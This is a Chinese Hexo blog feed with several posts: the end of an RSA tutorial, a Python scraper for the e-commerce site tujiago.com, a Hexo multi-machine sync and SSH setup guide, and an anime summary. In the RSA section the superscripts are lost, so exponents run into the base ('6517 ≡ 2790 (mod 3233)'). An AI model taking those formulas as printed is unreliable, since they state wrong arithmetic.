<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(<span class="number">1</span>)ed≡<span class="number">1</span> (mod φ(n))。只有知道e和φ(n)，才能算出d。</div><div class="line"></div><div class="line">(<span class="number">2</span>)φ(n)=(p<span class="number">-1</span>)(q<span class="number">-1</span>)。只有知道p和q，才能算出φ(n)。</div><div class="line"></div><div class="line">(<span class="number">3</span>)n=pq  只有将n因数分解，才能算出p和q。</div></pre></td></tr></table></figure>
<p>结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。</p>
<p>可是，大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。维基百科这样写道：</p>
<blockquote>
<p>　　“对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。</p>
<p>　　假如有人找到一种快速因数分解的算法，那么RSA的可靠性就会极度下降。但找到这样的算法的可能性是非常小的。今天只有短的RSA密钥才可能被暴力破解。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。</p>
<p>　　只要密钥长度足够长，用RSA加密的信息实际上是不能被解破的。”</p>
</blockquote>
<p>举例来说，你可以对3233进行因数分解（61×53），但是你没法对下面这个整数进行因数分解。</p>
<blockquote>
<p>　　12301866845301177551304949<br>　　58384962720772853569595334<br>　　79219732245215172640050726<br>　　36575187452021997864693899<br>　　56474942774063845925192557<br>　　32630345373154826850791702<br>　　61221429134616704292143116<br>　　02221240479274737794080665<br>　　351419597459856902143413</p>
</blockquote>
<p>它等于这样两个质数的乘积：</p>
<blockquote>
<p>　　33478071698956898786044169<br>　　84821269081770479498371376<br>　　85689124313889828837938780<br>　　02287614711652531743087737<br>　　814467999489<br>　　　　×<br>　　36746043666799590428244633<br>　　79962795263227915816434308<br>　　76426760322838157396665112<br>　　79233373417143396810270092<br>　　798736308917</p>
</blockquote>
<p>事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。</p>
<p>8.加密和解密</p>
<p>有了公钥和密钥，就能进行加密和解密了。</p>
<p>（1）加密要用公钥 (n,e)</p>
<p>假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p>
<p>所谓”加密”，就是算出下式的c：</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">me ≡ c (mod n)</div></pre></td></tr></table></figure>
<p>爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">6517</span> ≡ <span class="number">2790</span> (mod <span class="number">3233</span>)</div></pre></td></tr></table></figure>
<p>于是，c等于2790，鲍勃就把2790发给了爱丽丝。</p>
<p>（2）解密要用私钥(n,d)</p>
<p>爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd ≡ m (mod n)</div></pre></td></tr></table></figure></p>
<p>也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">27902753</span> ≡ <span class="number">65</span> (mod <span class="number">3233</span>)</div></pre></td></tr></table></figure></p>
<p>因此，爱丽丝知道了鲍勃加密前的原文就是65。</p>
<p>至此，”加密–解密”的整个过程全部完成。</p>
<p>我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。</p>
<p>你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种”对称性加密算法”（比如<a href="https://zh.wikipedia.org/wiki/%E8%B5%84%E6%96%99%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86" target="_blank" rel="external">DES</a>），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。</p>
<p>9.私钥解密的证明</p>
<p>最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cd ≡ m (mod n)</div></pre></td></tr></table></figure></p>
<p>因为，根据加密规则<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ｍe ≡ c (mod n)</div></pre></td></tr></table></figure></p>
<p>于是，c可以写成下面的形式：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c = me - kn</div></pre></td></tr></table></figure></p>
<p>将c代入要我们要证明的那个解密规则：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(me - kn)d ≡ m (mod n)</div></pre></td></tr></table></figure></p>
<p>它等同于求证<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">med ≡ m (mod n)</div></pre></td></tr></table></figure></p>
<p>由于<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ed ≡ <span class="number">1</span> (mod φ(n))</div></pre></td></tr></table></figure></p>
<p>所以<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ed = hφ(n)+<span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>将ed代入：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mhφ(n)+m ≡ m (mod n)</div></pre></td></tr></table></figure></p>
<p>接下来，分成两种情况证明上面这个式子。</p>
<p>（1）m与n互质。</p>
<p>根据欧拉定理，此时<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mφ(n) ≡ <span class="number">1</span> (mod n)</div></pre></td></tr></table></figure></p>
<p>得到<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(mφ(n))h × m ≡ m (mod n)</div></pre></td></tr></table></figure></p>
<p>原式得到证明。</p>
<p>（2）m与n不是互质关系。</p>
<p>此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。</p>
<p>以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(kp)q<span class="number">-1</span> ≡ <span class="number">1</span> (mod q)</div></pre></td></tr></table></figure></p>
<p>进一步得到<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[(kp)q<span class="number">-1</span>]h(p<span class="number">-1</span>) × kp ≡ kp (mod q)</div></pre></td></tr></table></figure></p>
<p>即<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(kp)ed ≡ kp (mod q)</div></pre></td></tr></table></figure></p>
<p>将它改写成下面的等式<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(kp)ed = tq + kp</div></pre></td></tr></table></figure></p>
<p>这时t必然能被p整除，即 t=t’p<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(kp)ed = t<span class="string">'pq + kp</span></div></pre></td></tr></table></figure></p>
<p>因为 m=kp，n=pq，所以<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">med ≡ m (mod n)</div></pre></td></tr></table></figure></p>
<p>得证</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[土家购农村电商爬虫代码示例]]></title>
      <url>/2017/05/12/%E5%9C%9F%E5%AE%B6%E8%B4%AD%E5%86%9C%E6%9D%91%E7%94%B5%E5%95%86%E7%88%AC%E8%99%AB%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B/</url>
      <content type="html"><![CDATA[<p>网络爬虫<br><a id="more"></a></p>
<p>首先在pycharm这个IDE中写爬虫的主体部分:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#爬取链接和信息的部分</span></div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> pymongo</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="comment">#连接本地数据库并创建两个表</span></div><div class="line">client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line">tujiagou = client[<span class="string">'tujiagou'</span>]</div><div class="line">url_list = tujiagou[<span class="string">'url_list'</span>]</div><div class="line">item_info = tujiagou[<span class="string">'item_info'</span>]</div><div class="line"></div><div class="line">start_url = <span class="string">'http://www.tujiago.com/'</span></div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36'</span>,</div><div class="line">    <span class="string">'Cookie'</span>:<span class="string">'store_id=0; vary=staticdad85da5caa9112672513bb15a0d7952; UM_distinctid=15bf1838e3c153-064bb97bcefed4-153d655c-384000-15bf1838e3db2b; S[FIRST_REFER]=%7B%22ID%22%3A%22%22%2C%22REFER%22%3A%22https%3A%2F%2Fwww.google.co.jp%2F%22%2C%22DATE%22%3A1494404751000%7D; s=587fac54ade2a1a79d1a27819bdee8db; page_load_times=4; NTKF_T2D_CLIENTID=guestECE58596-E636-C47B-9C38-F1838DDD3CAE; nTalk_CACHE_DATA=&#123;uid:kf_9332_ISME9754_guestECE58596-E636-C4,tid:1494405582300579&#125;; S[NOW_REFER]=%7B%22ID%22%3A%22%22%2C%22REFER%22%3A%22https%3A%2F%2Fwww.google.co.jp%2F%22%2C%22DATE%22%3A1494404751000%7D; S[N]=97FE7B11-7578-20E1-30BD-997B69666C35; CNZZDATA1259313336=1399165820-1494405492-null%7C1494405492'</span>,</div><div class="line">    <span class="string">'Referer'</span>:<span class="string">'https://www.google.co.jp/'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_links_from</span><span class="params">(channel)</span>:</span></div><div class="line">    list_view = channel</div><div class="line">    wb_data = requests.get(list_view,headers=headers)</div><div class="line">    soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> soup.select(<span class="string">'.ui-page-num &gt; a'</span>):</div><div class="line">            item_link = link.get(<span class="string">'href'</span>)</div><div class="line">            get_links_from_links(item_link)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_links_from_links</span><span class="params">(channel)</span>:</span></div><div class="line">    list_view = channel</div><div class="line">    wb_data = requests.get(list_view, headers=headers)</div><div class="line">    soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">    <span class="keyword">for</span> item_link <span class="keyword">in</span> soup.select(<span class="string">'a.entry-title'</span>):</div><div class="line">        item_link = start_url + item_link.get(<span class="string">'href'</span>)</div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line">        get_item_info_from(item_link)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_item_info_from</span><span class="params">(url,data=None)</span>:</span></div><div class="line">    wb_data = requests.get(url,headers=headers)</div><div class="line">    <span class="keyword">if</span> wb_data.status_code == <span class="number">404</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">            data = &#123;</div><div class="line">                <span class="string">'title'</span>:soup.title.text.strip(),</div><div class="line">                <span class="string">'price'</span>:soup.select(<span class="string">'em.goodsprice'</span>)[<span class="number">0</span>].text.strip(),</div><div class="line">                <span class="string">'area'</span>: soup.select(<span class="string">'span.tb-deliveryAdd.deliveryAddModi'</span>)[<span class="number">0</span>].text.strip(),</div><div class="line">                <span class="string">'view'</span>:list(soup.select(<span class="string">'em.color_3355aa.evaluation'</span>)[<span class="number">0</span>].stripped_strings),</div><div class="line">                <span class="string">'url'</span>:url</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">except</span> IndexError:</div><div class="line">            <span class="keyword">pass</span></div><div class="line">        <span class="keyword">except</span> AttributeError:</div><div class="line">            <span class="keyword">pass</span></div><div class="line">        print(data)</div><div class="line">        <span class="keyword">if</span> data:</div><div class="line">            item_info.insert_one(data)</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#主函数部分</span></div><div class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</div><div class="line"><span class="keyword">from</span> page_parsing <span class="keyword">import</span> get_item_info_from,get_links_from_links,get_links_from</div><div class="line"><span class="keyword">from</span> channel_extracting <span class="keyword">import</span> channel_list</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pool = Pool(processes=<span class="number">6</span>)</div><div class="line">    pool.map(get_links_from,channel_list.split())</div><div class="line">    pool.close()</div><div class="line">    pool.join()</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#爬取主页面链接</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">start_url = <span class="string">'http://www.tujiago.com/'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index_url</span><span class="params">(url)</span>:</span></div><div class="line">    wb_data = requests.get(url)</div><div class="line">    soup = BeautifulSoup(wb_data.text, <span class="string">'lxml'</span>)</div><div class="line">    links = soup.select(<span class="string">'p.category-1 &gt; a'</span>)</div><div class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</div><div class="line">        page_url = start_url + link.get(<span class="string">'href'</span>)</div><div class="line">        print(page_url)</div><div class="line"></div><div class="line"><span class="comment">#get_index_url(start_url)</span></div><div class="line"></div><div class="line">channel_list = <span class="string">'''</span></div><div class="line">http://www.tujiago.com//index.php/gallery-656.html</div><div class="line">http://www.tujiago.com//index.php/gallery-797.html</div><div class="line">http://www.tujiago.com//index.php/gallery-699.html</div><div class="line">http://www.tujiago.com//index.php/gallery-769.html</div><div class="line">http://www.tujiago.com//index.php/gallery-689.html</div><div class="line">http://www.tujiago.com//index.php/gallery-949.html</div><div class="line">'''</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#在jupyter notebook中的操作</span></div><div class="line"><span class="keyword">import</span> pymongo</div><div class="line"><span class="keyword">import</span> charts</div><div class="line"></div><div class="line">client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line">tujiagou = client[<span class="string">'tujiagou'</span>]</div><div class="line">url_list = tujiagou[<span class="string">'url_list'</span>]</div><div class="line">item_info = tujiagou[<span class="string">'item_info'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">data_gen</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> item_info.find(&#123;&#125;,&#123;<span class="string">'price'</span>:<span class="number">1</span>,<span class="string">'view'</span>:<span class="number">1</span>,<span class="string">'title'</span>:<span class="number">1</span>&#125;).limit(<span class="number">6</span>):</div><div class="line">        data = &#123;</div><div class="line">            <span class="string">'name'</span>: i[<span class="string">'title'</span>],</div><div class="line">            <span class="string">'data'</span>: [int(i[<span class="string">'view'</span>][<span class="number">0</span>])],</div><div class="line">            <span class="string">'type'</span>: <span class="string">'column'</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">yield</span> data</div><div class="line">        </div><div class="line">series = [i <span class="keyword">for</span> i <span class="keyword">in</span> data_gen()]</div><div class="line">options = &#123;</div><div class="line">    <span class="string">'chart'</span>   : &#123;<span class="string">'zoomType'</span>:<span class="string">'xy'</span>&#125;,</div><div class="line">    <span class="string">'title'</span>   : &#123;<span class="string">'text'</span>: <span class="string">'土家购浏览量与价钱的关系'</span>&#125;,</div><div class="line">    <span class="string">'subtitle'</span>: &#123;<span class="string">'text'</span>: <span class="string">'柱状图分析'</span>&#125;,</div><div class="line">    <span class="string">'yAxis'</span>   : &#123;<span class="string">'title'</span>: &#123;<span class="string">'text'</span>: <span class="string">'浏览量'</span>&#125;&#125;,</div><div class="line">    <span class="string">'xAxis'</span>   : &#123;<span class="string">'categories'</span>: [<span class="string">'商品类别'</span>]&#125;,</div><div class="line">    &#125;</div><div class="line"></div><div class="line">charts.plot(series,options=options,show=<span class="string">'inline'</span>)</div></pre></td></tr></table></figure>
<p>最后会生成如下的图表效果：</p>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-05-12%20%E4%B8%8B%E5%8D%883.53.00.png" alt="" title="" class="">
                <p></p>
            </figure>]]></content>
      
        <categories>
            
            <category> Python 爬虫 农村电商 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[多终端同步hexo博客]]></title>
      <url>/2017/03/21/%E5%A4%9A%E7%BB%88%E7%AB%AF%E5%90%8C%E6%AD%A5hexo%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p>多终端同步hexo<br><a id="more"></a></p>
<p>使用hexo是一个很棒的体验，但是由于它是一个静态博客，优点与缺点共存，它存活的生命周期更长，但没有和由于数据库连接，所以想要在多机上更新自己的博客会显得有些麻烦，但是事实上只要回想一下当初搭建时候的步骤，此时便会简化很多。而且有<a href="https://www.zhihu.com/question/21193762" target="_blank" rel="external">多种方案可供选择</a></p>
<p>重部署流程</p>
<blockquote>
<p>因为新电脑上面已经完全没有了hexo的环境，所以要重新部署一下。<br>1.先安装 <a href="http://nodejs.cn" target="_blank" rel="external">Node.js</a> 和 <a href="https://git-scm.com/downloads" target="_blank" rel="external">Git</a>，再安装完这两者后，再通过之前的步骤安装 Hexo。<br>2.在public下创建一个文件夹把整一个your_name.github.io 文件夹同步过来cd 到同步的 your_name.github.io 内， 然后再安装 Hexo：</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g hexo-cli</div></pre></td></tr></table></figure>
<p> <strong>为了部署，还要执行</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
<p>至此，在新的平台上运行 hexo clean，hexo generate ，hexo server 等命令应该就没有问题了。</p>
<p>Github配置<br>Step 1：Setting up Git。在 Git Bash 中执行如下代码即可：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git config --global user.name <span class="string">"YOUR NAME"</span> <span class="comment">#YOUR NAME 是自己取的名字</span></div><div class="line">git config --global user.email <span class="string">"YOUR EMAIL ADDRESS"</span> <span class="comment">#YOUR EMAIL ADDRESS 是自己的 Github 邮箱</span></div></pre></td></tr></table></figure></p>
<p>Step 2：Authenticating with GitHub from Git。<br>在 Git Bash 下执行如下命令，生成 SSH key<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -b 4096 -C     <span class="string">"your_email@example.com"</span></div><div class="line"><span class="comment">#your_email@example.com 是你的 Github 注册邮箱，剩下的一路回车即可。</span></div></pre></td></tr></table></figure></p>
<p>接下来将其保存在主目录下，其中id_rsa是你的私钥，不要被他人知道，你所要做的是把那个后缀.pub的公钥添加到你的github账户</p>
<p>将 SSH key 添加到 Github 账户<br>在 Git Bash 中将 SSH Key 拷贝出来：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">clip &lt; ~/.ssh/id_rsa.pub</div></pre></td></tr></table></figure></p>
<p>此时，SSH Key 已经在我们的剪切板里了。然后登录 Github 帐号，依次点击自己的头像，Settings，SSH and GPG keys， Add SSH key， 在 Title 这里输入 Key 的label，比如 your_name - PC，然后在 Key 里面把 SSH Key 粘贴进去，点击 Add SSH key 大功告成。<br>测试 SSH 连接，在 Git Bash 中敲入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -T git@github.com</div></pre></td></tr></table></figure></p>
<p>应该可以看到提示你成功的信息。<br>Hexo 部署：执行hexo deploy 应该就可以大功告成了。</p>
<p>另外附上一种高手方法，新手慎用：<a href="https://github.com/zjhou/E2P" target="_blank" rel="external">自动部署更新博客</a></p>
<p>​        </p>
]]></content>
      
        <categories>
            
            <category> 多终端同步 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[页面教程]]></title>
      <url>/2017/03/20/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<p>教程</p>
<a id="more"></a>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[秒速五厘米]]></title>
      <url>/2017/03/20/%E7%A7%92%E9%80%9F%E4%BA%94%E5%8E%98%E7%B1%B3/</url>
      <content type="html"><![CDATA[<p>我们之间横亘的是那漫长的、令人望而却步的人生<br><a id="more"></a></p>
<div style="text-align: center;"><br><br><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/u=91334677,4210224698&fm=23&gp=0.jpg" alt="sx" title="" class="">
                <p>sx</p>
            </figure><br><br></div>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="0" height="0" src="//music.163.com/outchain/player?type=2&id=540978&auto=1&height=66"></iframe>

<h2 id="故事概要"><a href="#故事概要" class="headerlink" title="故事概要"></a>故事概要</h2><p>   动画以一个少年为故事轴心而展开连续3个独立故事的动画短篇，时代背景是从1990年代至现代的日本，通过少年的人生展现东京以及其他地区的变迁。[1]  第一话《樱花抄》描述贵树与明里年幼时恋爱的心情，以及他们重逢的一天，第二话《宇航员》描述以对进入高中就读的贵树怀有好感的澄田花苗的视角来展现贵树与明里分别后的生活，第三话《秒速5厘米》则刻画了贵树和明里长大后内心的种种彷徨。</p>
<h2 id="剧情简介"><a href="#剧情简介" class="headerlink" title="剧情简介"></a>剧情简介</h2><h3 id="1-樱花抄"><a href="#1-樱花抄" class="headerlink" title="1.樱花抄"></a>1.樱花抄</h3><p>   远野贵树因为父母调职而转校来到东京的小学。一年后，篠原明里也转校来到同一班级。两人因体弱多病，不擅长运动，而喜欢独自待在图书馆。虽然年纪还小，可是两人还是互相吸引，对方在自己心中的存在渐渐变得无法取代。</p>
<p>  但是，两人亲密的世界因明里再度转校而悲哀地告终。之后，贵树一直努力地适应没有明里的世界。但在中学一年级的夏天，贵树收到明里写给他的信时，感情一下子再度涌现。他们开始通信，并再次得到能够互相传达心意的幸福。那年冬天，贵树要转校去一个遥远的地方。比现在分开得更远，可能再也不能见面。于是两人在信中约定：在放学后贵树乘电车到明里身处的栃木县岩舟车站，会合时间是晚上七时。 </p>
<p>  1995年3月4日，从早上开始下着寒冷的雨，中午时雨又变成了雪。放学后，贵树按约定乘坐电车前往岩舟车站。因下雪的缘故电车发生了晚点与停运，导致贵树错过了约定的时间，但在到达岩舟车站候车室时发现明里依然在等着他。候车室内贵树吃过明里做的茶点，其后与明里一同前往其信中所提到的樱花树，并在树下交换了初吻。那天晚上，两人在田边的仓库休息了一晚。次日，贵树乘坐早上的第一班电车和明里告别了。</p>
<h3 id="2-宇航员"><a href="#2-宇航员" class="headerlink" title="2.宇航员"></a>2.宇航员</h3><p>   中学二年级的第一天，澄田花苗看到从东京转校过来的远野贵树时，就已经喜欢上他。无论上课时还是放学后，甚至带狗在海边散步时，花苗都会在视线的一角寻找他的身影。为了和贵树在同一所高中而拼命温习，虽然合格了但还是没有向他告白的勇气，一直都暗恋着贵树。</p>
